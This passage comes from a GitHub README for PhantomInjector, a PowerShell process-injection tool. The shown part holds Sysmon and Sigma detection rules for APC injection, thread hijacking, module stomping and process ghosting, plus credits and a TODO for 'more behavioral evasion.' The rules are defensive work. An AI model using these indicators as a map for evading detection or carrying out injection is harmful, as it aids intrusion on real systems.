        <TargetFilename condition="contains">\ntdll.dll</TargetFilename>
    </FileCreate>
</RuleGroup>
```

#### 3\. **Memory Protection Alerts**

[Permalink: 3. Memory Protection Alerts](https://github.com/MazX0p/PhantomInjector#3-memory-protection-alerts)

```
<RuleGroup name="Memory_Protection_Changes">
    <MemoryProtection onmatch="include">
        <!-- RWX memory allocations -->
        <Protect condition="is">PAGE_EXECUTE_READWRITE</Protect>
        <CallTrace condition="contains">kernelbase.dll+</CallTrace>
    </MemoryProtection>
</RuleGroup>
```

#### 4\. **Process Ghosting Indicators**

[Permalink: 4. Process Ghosting Indicators](https://github.com/MazX0p/PhantomInjector#4-process-ghosting-indicators)

```
<RuleGroup name="Process_Ghosting">
    <FileCreate onmatch="include">
        <!-- Temp executable creation + deletion -->
        <TargetFilename condition="contains">Temp\</TargetFilename>
        <TargetFilename condition="end with">.exe</TargetFilename>
    </FileCreate>
    <ProcessCreate onmatch="include">
        <CommandLine condition="contains">-InjectionMethod GhostProcess</CommandLine>
    </ProcessCreate>
</RuleGroup>
```

#### 5\. **Thread Injection Patterns**

[Permalink: 5. Thread Injection Patterns](https://github.com/MazX0p/PhantomInjector#5-thread-injection-patterns)

```
<RuleGroup name="Thread_Injection">
    <CreateRemoteThread onmatch="include">
        <!-- PowerShell -> non-child process -->
        <StartModule condition="is">Unknown</StartModule>
        <SourceImage condition="end with">\powershell.exe</SourceImage>
    </CreateRemoteThread>
</RuleGroup>
```

* * *

### Detection Logic Table

[Permalink: Detection Logic Table](https://github.com/MazX0p/PhantomInjector#detection-logic-table)

| Technique | Primary Indicator | Sysmon Event ID |
| --- | --- | --- |
| APC Injection | `QueueUserAPC` from non-image memory | 10 |
| Thread Hijacking | `SetThreadContext` RIP modification | 8 |
| Module Stomping | Tail-of-image write + context hijack | 12 |
| Process Ghosting | Section creation from deleted files | 12 |
| Syscall Usage | NTDLL unhooking + unusual call traces | 7, 11 |

* * *

#### Recommended Baseline

[Permalink: Recommended Baseline](https://github.com/MazX0p/PhantomInjector#recommended-baseline)

```
# Sigma Rule Equivalent
detection:
  selection:
    EventID:
      - 1   # Process Creation
      - 8   # Remote Thread
      - 10  # Process Access
    Image|endswith:
      - '\powershell.exe'
      - '\cmd.exe'
    CommandLine|contains|all:
      - '-InjectionMethod'
      - '-Payload'
  condition: selection
```

**Pro Tip:** Combine with these Windows Event Log checks:

- **4688**: Process creation with suspicious command-line
- **4657**: Registry changes for COM hijacking
- **4104**: Script block logging for PowerShell

* * *

## Credits

[Permalink: Credits](https://github.com/MazX0p/PhantomInjector#credits)

- **Author**: 0xMaz Mohamed Alzhrani
- Techniques inspired by APCry, Process Ghosting studies, and community malware research.

## TODO:

[Permalink: TODO:](https://github.com/MazX0p/PhantomInjector#todo)

- More behavioral evasion

* * *

## License

[Permalink: License](https://github.com/MazX0p/PhantomInjector#license)

```
MIT — Use responsibly and only on authorized systems.
```

## About

Advanced In-Memory PowerShell Process Injection Framework


### Resources

[Readme](https://github.com/MazX0p/PhantomInjector#readme-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/MazX0p/PhantomInjector).

[Activity](https://github.com/MazX0p/PhantomInjector/activity)

### Stars

[**72**\\
stars](https://github.com/MazX0p/PhantomInjector/stargazers)

### Watchers

[**1**\\
watching](https://github.com/MazX0p/PhantomInjector/watchers)

### Forks

[**10**\\
forks](https://github.com/MazX0p/PhantomInjector/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FMazX0p%2FPhantomInjector&report=MazX0p+%28user%29)

## [Releases](https://github.com/MazX0p/PhantomInjector/releases)

No releases published

## [Packages\  0](https://github.com/users/MazX0p/packages?repo_name=PhantomInjector)

No packages published

## Languages

- [PowerShell100.0%](https://github.com/MazX0p/PhantomInjector/search?l=powershell)

You can’t perform that action at this time.